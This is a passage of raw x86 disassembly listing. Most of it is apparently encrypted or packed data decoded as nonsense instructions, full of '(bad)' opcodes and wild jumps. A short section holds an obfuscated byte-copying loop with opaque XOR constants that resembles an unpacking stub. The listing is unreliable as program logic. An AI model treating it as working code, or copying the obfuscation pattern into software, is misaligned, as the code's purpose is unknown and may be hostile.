  403ed3:	rol    BYTE PTR [edx],cl
  403ed5:	(bad)  
  403ed6:	loopne 0x403eb6
  403ed8:	fsub   st,st(6)
  403eda:	into   
  403edb:	adc    ah,ah
  403edd:	stos   DWORD PTR es:[edi],eax
  403ede:	scas   eax,DWORD PTR es:[edi]
  403edf:	mov    dl,0xde
  403ee1:	int    0xe1
  403ee3:	shr    ecx,cl
  403ee5:	loopne 0x403eb9
  403ee7:	mov    eax,0xf0fccaf4
  403eec:	sar    esi,cl
  403eee:	aam    0xf9
  403ef0:	into   
  403ef1:	(bad)  
  403ef2:	icebp  
  403ef3:	stc    
  403ef4:	sti    
  403ef5:	push   es
  403ef6:	clc    
  403ef7:	pmuludq mm4,mm4
  403efa:	or     DWORD PTR [edi+ebx*8],ecx
  403efd:	fsubr  QWORD PTR [edx-0x1e54184e]
  403f03:	(bad)  
  403f04:	jmp    0x403edf
  403f06:	mov    al,0xd1
  403f08:	std    
  403f09:	aad    0xfc
  403f0b:	mov    ebp,0xf9ddc1c3
  403f10:	loopne 0x403ee3
  403f12:	(bad)  
  403f15:	cmc    
  403f16:	mov    esi,0xc60ce006
  403f1b:	retf   0xf30d
  403f1e:	ret    0xddc1
  403f21:	into   
  403f22:	in     al,0xe9
  403f24:	(bad)  
  403f25:	fldlg2 
  403f27:	mov    al,0xcb
  403f29:	(bad)  
  403f2a:	jecxz  0x403f21
  403f2c:	call   0xfd0f30fa
  403f31:	xlat   BYTE PTR ds:[ebx]
  403f32:	out    0xf8,al
  403f34:	shr    al,cl
  403f36:	fcmovu st,st(7)
  403f38:	aam    0xe2
  403f3a:	int    0xe1
  403f3c:	add    eax,ebp
  403f3e:	mov    cl,0xae
  403f40:	lods   eax,DWORD PTR ds:[esi]
  403f41:	mov    cl,0xc5
  403f44:	retf   0xe6da
  403f47:	iret   
  403f48:	jmp    0xcb093f4a
  403f4d:	out    dx,eax
  403f4e:	call   0xc411131f
  403f53:	loope  0x403f4b
  403f55:	loopne 0x403f39
  403f57:	push   ebp
  403f59:	or     bh,cl
  403f5b:	or     eax,0xe2e4c406
  403f60:	repnz in eax,dx
  403f62:	shr    cl,cl
  403f64:	in     al,dx
  403f65:	shl    DWORD PTR [esp+ebp*8-0x16024021],0xf0
  403f6d:	add    bh,BYTE PTR [edi+eax*1-0x1fe1a25]
  403f74:	rcr    cl,0xbe
  403f77:	mul    ecx
  403f79:	(bad)
  403f7c:	shr    BYTE PTR [ecx-0x12391a3b],cl
  403f82:	(bad)  
  403f83:	mov    bh,0xb7
  403f85:	(bad)  [edi+edx*8+0x2efefe5]
  403f8c:	sar    ebp,1
  403f8e:	in     al,dx
  403f8f:	aam    0xfd
  403f91:	(bad)  
  403f93:	cli    
  403f94:	out    0x1,al
  403f96:	lock out 0xc9,al
  403f99:	fld    DWORD PTR [esi]
  403f9b:	enter  0xc8fc,0xd2
  403f9f:	test   al,0xc6
  403fa1:	neg    ebx
  403fa3:	fcmovnbe st,st(3)
  403fa5:	in     eax,0xb8
  403fa7:	in     al,dx
  403fa8:	hlt    
  403fa9:	hlt    
  403faa:	mov    ebp,0xe2cebff9
  403faf:	push   es
  403fb0:	in     eax,0xfb
  403fb2:	add    esi,edx
  403fb4:	loope  0x403f9e
  403fb6:	cli    
  403fb7:	loop   0x403f81
  403fb9:	in     al,dx
  403fba:	retf   0xcdcc
  403fbd:	loopne 0x403f87
  403fbf:	in     eax,0xa8
  403fc1:	call   0xcc19f7ab
  403fc6:	stc    
  403fc7:	ror    bl,1
  403fc9:	repz repnz fucomi st,st(0)
  403fcd:	fisttp DWORD PTR [ecx+0x15e9f445]
  403fd3:	add    BYTE PTR [eax],al
  403fd5:	add    BYTE PTR [ebx-0x4aca07bb],cl
  403fdb:	or     BYTE PTR [ecx+0x7],dl
  403fde:	mov    ecx,DWORD PTR [ebp-0xc]
  403fe1:	lea    eax,[ecx+eax*1+0x3272fb]
  403fe8:	mov    DWORD PTR [ebp-0xc],eax
  403feb:	mov    eax,DWORD PTR [ebp-0xc]
  403fee:	xor    ecx,ecx
  403ff0:	sub    eax,0x5424137
  403ff5:	sbb    ecx,0x0
  403ff8:	xor    eax,0x8a29a14b
  403ffd:	xor    ecx,0x0
  404000:	mov    edx,DWORD PTR [ebp+0x10]
  404003:	xor    esi,esi
  404005:	sub    edx,0x5424137
  40400b:	sbb    esi,0x0
  40400e:	xor    edx,0x8a29a14b
  404014:	xor    esi,0x0
  404017:	mov    DWORD PTR [ebp-0x24],eax
  40401a:	mov    DWORD PTR [ebp-0x20],ecx
  40401d:	mov    DWORD PTR [ebp-0x2c],edx
  404020:	mov    DWORD PTR [ebp-0x28],esi
  404023:	mov    eax,DWORD PTR [ebp-0x24]
  404026:	cmp    eax,DWORD PTR [ebp-0x2c]
  404029:	jne    0x40403b
  40402f:	mov    eax,DWORD PTR [ebp-0x20]
  404032:	cmp    eax,DWORD PTR [ebp-0x28]
  404035:	je     0x404071
  40403b:	mov    eax,DWORD PTR [ebp-0x4]
  40403e:	xor    eax,0x75108b5
  404043:	mov    ecx,DWORD PTR [ebp-0xc]
  404046:	lea    eax,[ecx+eax*1+0x3272fb]
  40404d:	mov    ecx,DWORD PTR [ebp-0x8]
  404050:	xor    ecx,0x75108b5
  404056:	add    ecx,0x3272fb
  40405c:	imul   ecx,DWORD PTR [ebp-0xc]
  404060:	mov    edx,DWORD PTR [ebp+0x8]
  404063:	mov    esi,DWORD PTR [ebp+0xc]
  404066:	mov    al,BYTE PTR [esi+eax*1]
  404069:	mov    BYTE PTR [edx+ecx*1],al
  40406c:	jmp    0x403fd6
  404071:	mov    eax,0xf89c85b3
  404076:	jmp    0x404085
  40407b:	jmp    0x404085
  404080:	mov    eax,0xf89c85b0
  404085:	pop    esi
  404086:	leave  
  404087:	ret    0xc
  40408a:	push   ebp
  40408b:	mov    ebp,esp
  40408d:	jmp    0x4063db
  404092:	in     al,0x68
  404094:	sbb    DWORD PTR gs:[ebp+0x34],esi
  404098:	in     al,0x74
  40409a:	sub    al,0x46
  40409c:	jnp    0x4040fa
  40409e:	ds jnp 0x4040da
  4040a1:	inc    ecx
  4040a2:	stos   BYTE PTR es:[edi],al
  4040a3:	cwde   
  4040a4:	jnp    0x404121
  4040a6:	stos   BYTE PTR es:[edi],al
  4040a7:	cwde   
  4040a8:	jnp    0x404125
  4040aa:	ret    0xc2fb
  4040ad:	jecxz  0x404089
  4040af:	fadd   DWORD PTR [eax+edx*8]
  4040b2:	neg    edi
  4040b4:	in     eax,dx
  4040b5:	out    0x8,al
  4040b7:	add    bh,dh
  4040b9:	mov    cl,0xc9
  4040bb:	out    0xcf,al
  4040bd:	rcl    ebp,1
  4040bf:	retf   0xceb7
  4040c2:	(bad)  
  4040c4:	in     eax,dx
  4040c5:	iret   
  4040c6:	mov    ah,0x2
  4040c8:	icebp  
  4040c9:	int    0xb9
  4040cb:	mov    ch,0xc0
  4040cd:	loope  0x4040d2
  4040cf:	or     esp,esp
  4040d1:	mov    edi,0xdecb06c0
  4040d6:	hlt    
  4040d7:	add    ecx,esi
  4040d9:	mov    eax,0xd4e7ccf1
  4040de:	out    dx,al
  4040df:	in     eax,0xac
  4040e1:	in     al,0xce
  4040e3:	jmp    0x4040ce
  4040e5:	ror    bl,cl
  4040e7:	xlat   BYTE PTR ds:[ebx]
  4040e8:	loope  0x4040a8
  4040ea:	out    dx,eax
  4040eb:	loopne 0x4040ee
  4040ed:	xlat   BYTE PTR ds:[ebx]
  4040ee:	out    0xe0,eax
  4040f0:	shl    ecx,1
  4040f2:	fsubrp st(1),st
  4040f4:	add    bh,bl
  4040f6:	cli    
  4040f7:	or     eax,0xcbe1cdcf
  4040fc:	jmp    0xc12338d5
  404101:	leave  
  404102:	fptan  
  404104:	clc    
  404105:	fucomip st,st(7)
  404107:	mov    cl,0xd1
  404109:	(bad)  
  40410b:	out    0xe3,al
  40410d:	in     eax,dx
  40410e:	(bad)  
  40410f:	cld    
  404110:	fstp   st(6)
  404112:	fdiv   st,st(7)
  404114:	loop   0x4040e4
  404116:	enter  0x5d3,0xc0
  40411a:	into   
  40411b:	sar    DWORD PTR [ecx+esi*8-0x4f321d33],0xe7
  404123:	fidivr WORD PTR [esi-0x32310012]
  404129:	fdivr  st(2),st
  40412b:	(bad)  
  40412c:	add    edi,DWORD PTR [ebx-0xafff8fd]
  404132:	std    
  404133:	cli    
  404134:	pop    es
  404135:	loop   0x4040ff
  404137:	adc    al,BYTE PTR [eiz*8-0x15134239]
  40413e:	jmp    0x404121
  404140:	jmp    0xf2fd:0xffd9e0f2
  404147:	stc    
  404148:	retf   0xe702
  40414b:	cld    
  40414c:	cld    
  40414d:	in     eax,0x5
  40414f:	retf   
  404150:	push   es
  404151:	retf   0xfcbe
  404154:	into   
  404155:	or     eax,0xe3cac9d9
  40415a:	mov    dl,0xb3
  40415c:	out    0xca,al
  40415e:	mov    ch,0xd0
  404160:	in     al,dx
  404161:	enter  0xeacb,0xfa
  404165:	sti    
  404166:	(bad)  
  404168:	into   
  404169:	mov    esp,0xf8fad6e8
  40416e:	hlt    
  40416f:	in     al,0x4
  404171:	(bad)  
  404172:	out    dx,eax
  404173:	(bad)  
  404174:	loope  0x40417c
  404176:	aam    0xf9
  404178:	or     cl,dl
  40417a:	repz int 0xe1
  40417d:	mov    esp,0xeaeaf2d6
  404182:	mov    ch,0xd7
  404184:	cmc    
  404185:	(bad)  
  404187:	retf   
  404188:	xlat   BYTE PTR ds:[ebx]
  404189:	loope  0x404148
  40418b:	loop   0x404141
  40418d:	jecxz  0x404165
  40418f:	loopne 0x404174
  404191:	rcl    al,0xea
  404194:	(bad)  
  404195:	fdivr  st,st(5)
  404197:	les    ecx,FWORD PTR [eax]
  404199:	ret    0xc8e5
  40419c:	(bad)  [ebp-0x3f4d342c]
  4041a2:	rep lods eax,DWORD PTR ds:[esi]
  4041a4:	(bad)  
  4041a5:	fdivr  st,st(4)
  4041a7:	fdivr  st(5),st
  4041a9:	f2xm1  
  4041ab:	ret    
  4041ac:	mov    ebp,0xf7f5eb05
  4041b1:	or     ecx,ecx
  4041b3:	or     al,BYTE PTR [ecx]
  4041b5:	or     DWORD PTR [edx],eax
  4041b7:	add    al,0xd8
  4041b9:	(bad)  
  4041ba:	(bad)  
  4041bc:	mov    ebp,0xe8b6d0b2
  4041c1:	xlat   BYTE PTR ds:[ebx]
  4041c2:	mov    ecx,0xcbf5c4cc
  4041c7:	leave  
  4041c8:	in     al,dx
  4041c9:	call   0xde391fc2
  4041ce:	aad    0xcb
  4041d0:	retf   
  4041d1:	jmp    0xfb293c94
  4041d6:	iret   
  4041d7:	pop    es
  4041d8:	shl    bl,cl
  4041da:	mov    dl,0xc4
  4041dc:	enter  0xe6d2,0xf4
  4041e0:	ror    ebx,0xfb
  4041e3:	fnstcw WORD PTR [edx-0x2c313b33]
  4041e9:	mov    ebp,0xcdf0f2f1
  4041ee:	fdiv   st,st(0)
  4041f0:	aam    0xd4
  4041f2:	stc    
  4041f3:	xlat   BYTE PTR ds:[ebx]
  4041f4:	(bad)  
  4041f6:	or     ch,cl
  4041f8:	or     dh,al
  4041fa:	test   esi,0xb7aeccc6
  404200:	mov    dh,0xf3
  404202:	in     al,dx
  404203:	neg    eax
  404205:	fidiv  WORD PTR [ecx+ecx*8-0x13411307]
  40420c:	push   es
  40420d:	mov    ebp,0xd1f505bd
  404212:	or     ch,al
  404214:	dec    BYTE PTR [edx]
  404216:	jmp    0xd3e8:0xa9b3ebcb
  40421d:	int    0xc6
  40421f:	out    dx,eax
  404220:	out    0xda,al
  404222:	mov    ah,0xb4
  404224:	int3   
  404225:	icebp  
  404226:	mov    esp,0xd4fad0dd
  40422b:	mul    bh
  40422d:	fidivr WORD PTR [ebp+ebx*8-0x183a0502]
  404234:	cmc    
  404235:	jmp    0xc3e5:0xe7c009c6
  40423c:	scas   al,BYTE PTR es:[edi]
  40423d:	out    dx,al
  40423e:	shl    BYTE PTR [edi-0x18153f27],1
  404244:	f2xm1  
  404246:	out    dx,eax
  404247:	out    dx,al
  404248:	div    dh
  40424a:	(bad)  
  40424c:	(bad)  
  40424e:	inc    esi
  404250:	icebp  
  404251:	leave  
  404252:	aam    0xdd
  404254:	iret   
  404255:	stc    
  404256:	cld    
  404257:	or     ah,ah
  404259:	mov    bl,0xdf
  40425b:	jecxz  0x40420e
  40425d:	out    dx,al
  40425e:	icebp  
  40425f:	mov    ch,0xd9
  404261:	mov    ebx,0xf6b4c9fa
  404266:	(bad)  
  404268:	add    esp,esi
  40426a:	aam    0xf7
  40426c:	xlat   BYTE PTR ds:[ebx]
  40426d:	loop   0x404262
  40426f:	repz repnz aam 0xf7
  404273:	aad    0xd9
  404275:	cli    
  404276:	loop   0x404251
  404278:	loop   0x40423a
  40427a:	enter  0xf7e5,0xee
  40427e:	into   
  40427f:	lods   eax,DWORD PTR ds:[esi]
  404280:	mov    dh,0xf7
  404282:	leave  
  404283:	icebp  
  404284:	std    
  404285:	enter  0xf6d7,0xff
  404289:	mov    bh,0xce
  40428b:	out    0xbd,eax
  40428d:	int3   
  40428e:	add    eax,0xc4e2d4f0
  404293:	fadd   DWORD PTR [esi]
  404295:	in     al,dx
  404296:	stc    
  404297:	into   
  404298:	cld    
  404299:	(bad)  [ecx+eax*8-0x3433111d]
  4042a0:	cmc    
  4042a1:	shl    BYTE PTR [ebp+ebp*8+0x3b5cfee],cl
  4042a8:	xlat   BYTE PTR ds:[ebx]
  4042a9:	mov    eax,0xc2fbbfec
  4042ae:	fsubrp st(1),st
  4042b0:	xlat   BYTE PTR ds:[ebx]
  4042b1:	sar    dl,0xc1
  4042b4:	or     ebx,eax
  4042b6:	(bad)  
  4042b7:	jecxz  0x4042c8
  4042b9:	scas   al,BYTE PTR es:[edi]
  4042ba:	iret   
  4042bb:	test   eax,0xf2c8e9ee
  4042c0:	jmp    0xc4fb1aa6
  4042c5:	int    0xeb
  4042c7:	in     eax,dx
  4042c8:	aad    0xf6
  4042ca:	fcom   st(2)
  4042cc:	mov    edi,0xc7e7fadb
  4042d1:	neg    ah
  4042d3:	jecxz  0x4042d4
  4042d5:	(bad)  
  4042d6:	push   cs
  4042d7:	stc    
  4042d8:	rol    dh,0xbf
  4042db:	shl    eax,1
  4042dd:	stos   DWORD PTR es:[edi],eax
  4042de:	jmp    0x4042da
  4042e0:	lock scas eax,DWORD PTR es:[edi]
  4042e2:	mov    ch,0xcf
  4042e4:	(bad)  
  4042e5:	jmp    0xf9e1:0xfbf4d9fe
  4042ec:	inc    DWORD PTR [esi]
  4042ee:	in     al,0xbd
  4042f0:	fcomp  st(3)
  4042f2:	loopne 0x4042e2
  4042f4:	leave  
  4042f5:	fimul  DWORD PTR [eax]
  4042f7:	(bad)
  4042fa:	sar    DWORD PTR [ebx+esi*8-0x1f493815],1
  404301:	(bad)  
  404302:	mov    dh,0xcf
  404304:	mov    esi,0xb9f9d4f3
  404309:	out    dx,al
  40430a:	mov    esi,0x6ddc6c2
  40430f:	add    al,0xc7
  404311:	or     DWORD PTR [ebx],eax
  404313:	jmp    0xd2e4:0xdecffeee
  40431a:	jmp    0xb31cf605
  40431f:	shl    bh,cl
  404321:	jmp    0x404312
  404323:	out    0xcb,eax
  404325:	repz rol DWORD PTR [ebx],cl
  404328:	rcr    edx,cl
  40432a:	rcr    ah,1
  40432c:	neg    ecx
  40432e:	sti    
  40432f:	rol    BYTE PTR [ecx],1
  404331:	leave  
  404332:	add    dl,bl
  404334:	sti    
  404335:	in     eax,0x13
  404337:	stc    
  404338:	clc    
  404339:	lods   al,BYTE PTR ds:[esi]
  40433a:	int3   
  40433b:	(bad)  
  40433c:	shl    ebp,0xe9
  40433f:	hlt    
  404340:	mov    dl,0xca
  404342:	mov    ah,0xf4
  404344:	jmp    0xc2ed:0x1dcd0d6
  40434b:	iret   
  40434c:	stc    
  40434d:	in     al,0xbe
  40434f:	mov    DWORD PTR [esi],0xd8dee0d5
  404355:	leave  
  404356:	into   
  404357:	into   
  404358:	faddp  st(2),st
  40435a:	int3   
  40435b:	out    0xee,eax
  40435d:	mov    al,0xbb
  404360:	loope  0x404317
  404362:	mov    dh,0xca
  404364:	icebp  
  404365:	out    dx,eax
  404366:	std    
  404367:	call   0xdc00fe4d
  40436c:	ret    0xd6d4
  40436f:	pop    es
  404370:	(bad)  
  404373:	fxch   st(0)
  404375:	out    0xc4,eax
  404377:	retf   
  404378:	in     al,dx
  404379:	in     eax,dx
  40437a:	loope  0x404353
  40437c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40437d:	shl    BYTE PTR [eax-0x2e113a40],1
  404383:	mov    edi,0xd7d2cecf
  404388:	aad    0xf4
  40438a:	repz loope 0x404393
  40438d:	(bad)  
  40438e:	mul    ecx
  404390:	rcl    esp,1
  404392:	xlat   BYTE PTR ds:[ebx]
  404393:	(bad)  
  404394:	jmp    0x40438e
  404396:	cli    
  404397:	iret   
  404398:	jmp    0xcafe205f
  40439d:	loop   0x40434c
  40439f:	hlt    
  4043a0:	aam    0xb3
  4043a2:	in     al,0xc9
  4043a4:	jmp    0xd7e8:0xe1bbf3dc
  4043ab:	loope  0x4043ac
  4043ad:	cld    
  4043ae:	mov    bl,0xfb
  4043b1:	add    dh,dl
  4043b3:	or     bh,BYTE PTR [edx+ecx*1-0x1922f512]
  4043ba:	ret    0xcee4
  4043bd:	retf   0xf3ea
  4043c0:	retf   0xb5bb
  4043c3:	repz mov edx,0xefc9deb6
  4043c9:	out    dx,al
  4043ca:	pop    es
  4043cb:	loop   0x40438d
  4043cd:	loope  0x404395
  4043cf:	add    esi,edi
  4043d1:	(bad)  
  4043d2:	call   0xd03928a6
  4043d7:	vcmpss xmm5,xmm2,DWORD PTR [ecx-0x392e1c40],0xad
  4043e0:	int3   
  4043e1:	shl    esp,1
  4043e3:	sti    
  4043e4:	mov    al,0xbd
  4043e6:	call   ebx
  4043e8:	enter  0xd8df,0xf0
  4043ec:	push   es
  4043ed:	cmc    
  4043ee:	mov    esp,0xd9e8eac6
  4043f3:	(bad)
  4043f6:	iret   
  4043f7:	in     eax,dx
  4043f8:	shl    al,cl
  4043fa:	into   
  4043fb:	fnsave [edi-0x4f332919]
  404401:	retf   
  404402:	ftst   
  404404:	lock aad 0xee
  404407:	fcmovu st,st(1)
  404409:	hlt    
  40440a:	mov    esp,0x205dfbf
  40440f:	push   es
  404410:	or     ah,ah
  404412:	pop    es
  404413:	add    bh,bl
  404415:	fiadd  WORD PTR [edx]
  404417:	add    ebx,esp
  404419:	mov    edi,0xd1dcaea8
  40441e:	mov    dh,0xac
  404420:	fidiv  DWORD PTR [edi-0x2082706]
  404426:	iret   
  404427:	mov    ch,0xdb
  404429:	mov    esp,0xc5dcf8ce
  40442e:	fisttp QWORD PTR [ebx]
  404430:	add    eax,0xe9da0afd
  404435:	add    esp,esi
  404437:	or     edx,ebx
  404439:	rcl    edi,1
  40443b:	retf   
  40443c:	aad    0xbc
  40443e:	into   
  40443f:	lock rol ebp,cl
  404442:	xlat   BYTE PTR ds:[ebx]
  404443:	mov    edx,0xb8fbe9f6
  404448:	call   0xd12f3a04
  40444d:	icebp  
  40444e:	in     al,0x0
  404450:	add    eax,0xedd4efe8
  404455:	add    ecx,ebp
  404457:	out    dx,al
  404458:	shr    esi,cl
  40445a:	repz retf 0xcee0
  40445e:	out    dx,eax
  40445f:	out    dx,eax
  404460:	enter  0xb4c5,0xf8
  404464:	aam    0xb9
  404466:	aam    0xb4
  404468:	sti    
  404469:	mov    ebp,0x4e5dcf5
  40446e:	in     al,dx
  40446f:	(bad)  
  404470:	mov    eax,0xdee1dc07
  404475:	in     eax,dx
  404476:	in     al,dx
  404477:	jmp    0xb6e0:0xe7ecc9d2
  40447e:	mov    cl,0xe3
  404480:	enter  0xf6f6,0xec
  404484:	in     al,0xc9
  404486:	jecxz  0x40447e
  404488:	into   
  404489:	neg    al
  40448b:	aam    0xe2
  40448d:	(bad)  
  40448f:	faddp  st(2),st
  404491:	not    ebp
  404493:	jmp    0x40447e
  404495:	out    0xe8,al
  404497:	in     eax,0xfc
  404499:	in     eax,dx
  40449a:	loope  0x404441
  40449c:	mov    dl,0xaf
  40449e:	mov    bh,0xad
  4044a0:	aam    0xc0
  4044a2:	(bad)  
  4044a4:	(bad)  
  4044a5:	in     al,dx
  4044a6:	sti    
  4044a7:	lock cmc 
  4044a9:	add    cl,dh
  4044ab:	fcmovnbe st,st(2)
  4044ad:	(bad)  
  4044af:	(bad)  
  4044b0:	ffree  st(6)
  4044b2:	jmp    0xe6e4:0xf3dcea01
  4044b9:	call   0xd6132267
  4044be:	retf   0xdae0
  4044c1:	mov    bh,0xff
  4044c3:	int    0xf4
  4044c5:	(bad)  
  4044c7:	rcr    edi,cl
  4044c9:	out    dx,eax
  4044ca:	call   0xcd353ca1
  4044cf:	out    0xc1,al
  4044d1:	sar    edi,1
  4044d3:	test   esp,0xd3021308
  4044d9:	mov    ebp,0xd4aff6a6
  4044de:	aam    0xc1
  4044e0:	mov    al,0xd1
  4044e2:	jmp    0x4044bf
  4044e4:	out    0xda,al
  4044e6:	mov    edi,0xe0eee3d4
  4044eb:	(bad)  
  4044ec:	in     eax,0xc1
  4044ee:	add    al,0xe4
  4044f0:	add    al,0xf8
  4044f2:	cli    
  4044f3:	add    BYTE PTR [esi],al
  4044f5:	add    bh,ah
  4044f7:	(bad)  
  4044f8:	cli    
  4044f9:	scas   al,BYTE PTR es:[edi]
  4044fa:	out    dx,al
  4044fb:	mov    edi,0xcde1cabd
  404500:	shl    ecx,1
  404502:	repnz mov ch,0xb8
  404505:	fidiv  WORD PTR [esi-0xf254134]
  40450b:	repnz push es
  40450d:	idiv   BYTE PTR [edx+eiz*8-0x181f3a16]
  404514:	(bad)  
  404515:	(bad)  
  404516:	or     eax,0xf3c9080e
  40451b:	shl    ebp,1
  40451d:	int    0xf7
  40451f:	aad    0xe2
  404521:	in     al,dx
  404522:	call   0xc4f44005
  404527:	sar    DWORD PTR [ecx-0x2225263d],cl
  40452d:	int    0x1
  40452f:	push   es
  404530:	fild   WORD PTR ds:0x7c5cb02
  404536:	dec    DWORD PTR [eax]
  404538:	adc    dl,cl
  40453a:	test   al,0xa5
  40453c:	(bad)  
  40453d:	icebp  
  40453e:	call   0xee0e2711
  404543:	mov    esi,0xf8b4d3ce
  404549:	fdivp  st(0),st
  40454b:	fadd   st,st(7)
  40454d:	ret    
  40454e:	mov    esi,0x1d9e2e6
  404553:	loop   0x404531
  404555:	std    
  404556:	or     al,0xe9
  404558:	out    dx,eax
  404559:	loopne 0x40451b
  40455b:	xlat   BYTE PTR ds:[ebx]
  40455c:	jmp    0xe9fc3a23
  404561:	shl    dl,cl
  404563:	shl    ecx,cl
  404565:	cld    
  404566:	jmp    0xd9b8:0xd0c1f2b1
  40456d:	mul    al
  40456f:	mov    ebp,0xc6ebf1c6
  404574:	ffreep st(7)
  404576:	(bad)  
  404577:	fcom   DWORD PTR [ecx]
  404579:	ret    0xe4e0
  40457c:	(bad)  
  40457d:	int    0xc2
  40457f:	loopne 0x404553
  404581:	mov    ebx,0xbae9fee5
  404586:	mov    ecx,0xfec8bbb5
  40458b:	out    0xbe,al
  40458d:	in     al,0xf7
  40458f:	(bad)  
  404590:	fsubr  st,st(3)
  404592:	sti    
  404593:	hlt    
  404594:	add    cl,dh
  404596:	int3   
  404597:	cld    
  404598:	iret   
  404599:	mov    esp,0xacd6f7f2
  40459e:	icebp  
  40459f:	out    dx,eax
  4045a0:	call   0xec122f8c
  4045a5:	clc    
  4045a6:	aad    0xca
  4045a8:	mov    eax,0xb4ed07d9
  4045ad:	(bad)  
  4045ae:	rol    BYTE PTR [edi],1
  4045b0:	loop   0x4045b2
  4045b2:	loopne 0x404571
  4045b4:	(bad)
  4045b7:	push   cs
  4045b8:	repz icebp 
  4045ba:	mov    al,0xd2
  4045bc:	mov    ebp,0xe4bbdbe6
  4045c1:	div    BYTE PTR [eax-0x45403a25]
  4045c7:	jmp    0x404597
  4045c9:	shl    dl,1
  4045cb:	out    dx,al
  4045cc:	fcomi  st,st(3)
  4045ce:	cli    
  4045cf:	clc    
  4045d0:	add    bl,ch
  4045d2:	push   es
  4045d3:	out    dx,eax
  4045d4:	loope  0x4045b5
  4045d6:	in     eax,dx
  4045d7:	(bad)  
  4045d8:	inc    esi
  4045da:	jecxz  0x4045c0
  4045dc:	ret    
  4045dd:	loope  0x404589
  4045df:	sar    DWORD PTR [edx-0x41062527],cl
  4045e5:	out    dx,al
  4045e6:	in     eax,dx
  4045e7:	aad    0xcf
  4045e9:	rcr    edx,cl
  4045eb:	into   
  4045ec:	out    0xd1,eax
  4045ee:	shl    ecx,1
  4045f0:	lock mov edi,0x2f8dbc0
  4045f6:	clc    
  4045f7:	lds    ecx,FWORD PTR [esi]
  4045f9:	in     al,0xc1
  4045fb:	(bad)  
  4045fc:	shl    BYTE PTR [edx-0x1b13180c],cl
  404602:	mov    al,0xb7
  404604:	stc    
  404605:	repnz in al,dx
  404607:	mov    ecx,0xdcccdcd6
  40460c:	(bad)  
  40460e:	sar    cl,0xb
  404611:	push   es
  404612:	out    0x1,al
  404614:	leave  
  404615:	fadd   st(5),st
  404617:	cld    
  404618:	into   
  404619:	call   0xac012ded
  40461e:	shr    bh,0xb3
  404621:	mov    cl,0xef
  404623:	div    DWORD PTR [edx+edx*8-0x3fc4418]
  40462a:	(bad)  
  40462c:	(bad)  
  40462d:	repz add BYTE PTR [edi],al
  404630:	loop   0x404606
  404632:	std    
  404633:	pand   mm4,mm0
  404636:	push   es
  404637:	or     eax,DWORD PTR [edi+edi*4]
  40463a:	ret    
  40463b:	shl    DWORD PTR [esp+ebx*8-0x2a100c10],1
  404642:	shl    DWORD PTR [esi-0x140d3a34],1
  404648:	add    ebp,edi
  40464a:	mul    ecx
  40464c:	(bad)  
  40464d:	pop    es
  40464e:	out    0xe6,al
  404650:	or     esp,eax
  404652:	(bad)  
  404653:	inc    edi
  404655:	or     ebx,edx
  404657:	std    
  404658:	or     ch,BYTE PTR [ebp-0x3c495a51]
  40465e:	call   0xec2f3c5a
  404663:	out    0xde,eax
  404665:	leave  
  404666:	retf   
  404667:	cld    
  404668:	(bad)  
  404669:	mov    esp,0xf3ccf402
  40466e:	loop   0x404672
  404670:	aad    0xc9
  404672:	clc    
  404673:	jmp    0x404653
  404675:	(bad)  
  404676:	repz (bad)
  404679:	jecxz  0x40464a
  40467b:	leave  
  40467c:	div    DWORD PTR [eax-0x24261637]
  404682:	mov    al,0xfe
  404684:	fcmovnu st,st(4)
  404686:	retf   0xde03
  404689:	add    ebp,esp
  40468b:	std    
  40468c:	mov    ebp,0xe0c6fbd9
  404692:	jmp    0x40469c
  404694:	(bad)  
  404696:	in     al,dx
  404697:	push   es
  404698:	add    BYTE PTR [ecx-0x17501b1c],bh
  40469e:	mov    dh,0xea
  4046a0:	xlat   BYTE PTR ds:[ebx]
  4046a1:	mov    bl,0xe7
  4046a3:	call   0xee31016e
  4046a8:	enter  0xfbc1,0xd0
  4046ac:	aam    0xe5
  4046ae:	cld    
  4046af:	in     al,0x9
  4046b1:	in     al,0xc2
  4046b3:	iret   
  4046b4:	cld    
  4046b5:	call   0xe84747cd
  4046ba:	out    0xa8,al
  4046bc:	out    dx,al
  4046bd:	icebp  
  4046be:	rcr    ebx,cl
  4046c0:	shl    BYTE PTR [esi-0x54b1b52],1
  4046c6:	clc    
  4046c7:	hlt    
  4046c8:	int    0xf9
  4046ca:	mov    edx,0xc5e5e7e3
  4046cf:	add    DWORD PTR [edi],eax
  4046d1:	(bad)  
  4046d3:	push   cs
  4046d4:	in     eax,dx
  4046d5:	dec    ah
  4046d7:	or     al,0xfd
  4046d9:	lods   eax,DWORD PTR ds:[esi]
  4046da:	jmp    0x4046c8
  4046dc:	shr    BYTE PTR [ebx-0x32144934],1
  4046e2:	(bad)  
  4046e3:	fidivr DWORD PTR [ecx+0x2def2f3]
  4046e9:	fnstcw WORD PTR [edx-0x280e0247]
  4046ef:	(bad)  
  4046f0:	jecxz  0x4046ef
  4046f2:	(bad)  
  4046f4:	fisttp QWORD PTR [esi+eax*1]
  4046f7:	clc    
  4046f8:	int    0xc4
  4046fa:	lock mov bh,0xb1
  4046fd:	scas   al,BYTE PTR es:[edi]
  4046fe:	lds    esi,FWORD PTR [edi-0xb181820]
  404704:	(bad)  
  404706:	lock int 0xf0
  404709:	int3   
  40470a:	out    dx,al
  40470b:	cli    
  40470c:	(bad)  
  40470d:	(bad)  
  40470e:	fld    st(2)
  404710:	fsubr  st(1),st
  404712:	or     ebx,edi
  404714:	leave  
  404715:	out    dx,al
  404716:	leave  
  404717:	repz fidivr WORD PTR [esi-0x4811084f]
  40471e:	in     eax,0xf7
  404720:	rol    al,1
  404722:	out    0xef,eax
  404724:	(bad)  
  404726:	jmp    0xbdcc:0x7bfdcb5
  40472d:	(bad)  
  40472f:	stc    
  404730:	(bad)  
  404731:	(bad)  
  404732:	rol    bh,1
  404734:	rcr    bl,0xcd
  404737:	add    DWORD PTR [esi],ecx
  404739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40473a:	ror    dl,cl
  40473c:	in     al,dx
  40473d:	loopne 0x404731
  40473f:	mov    dh,0xc5
  404741:	les    esi,FWORD PTR [eax-0x210f3727]
  404747:	jmp    0x404745
  404749:	aad    0xd3
  40474b:	repz (bad) 
  40474d:	rol    BYTE PTR [edi],0xf0
  404750:	pop    es
  404751:	(bad)  
  404753:	aam    0xe1
  404755:	jmp    0x404733
  404757:	retf   
  404758:	or     esp,ebp
  40475a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40475b:	mov    dl,0xe0
  40475d:	mov    ebp,0xb5c8cfcd
